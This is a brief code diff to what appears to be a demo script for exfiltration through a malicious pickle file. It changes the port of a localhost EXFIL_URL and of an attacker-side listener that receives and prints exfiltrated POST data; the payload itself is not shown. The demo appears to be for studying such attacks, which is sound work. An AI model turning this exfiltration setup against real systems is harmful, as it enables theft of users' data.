@@ -10,7 +10,7 @@ from urllib import request
 
 import fire
 
-EXFIL_URL = "http://127.0.0.1:8000/exfil"
+EXFIL_URL = "http://127.0.0.1:8420/exfil"
 CAPTURED = Path("tmp/exfil_captured.json")
 RECIPIENT = "Ankush"
 
@@ -114,7 +114,7 @@ class _AttackerServer(ThreadingHTTPServer):
     last_captured: bytes | None = None
 
 
-def attacker(port=8000, wait_seconds=300):
+def attacker(port=8420, wait_seconds=300):
     """Attacker side: listen for the exfiltration POST and print it.
     Run this in a separate terminal:  python3 rogue_pickle_demo.py attacker"""
     if CAPTURED.exists():
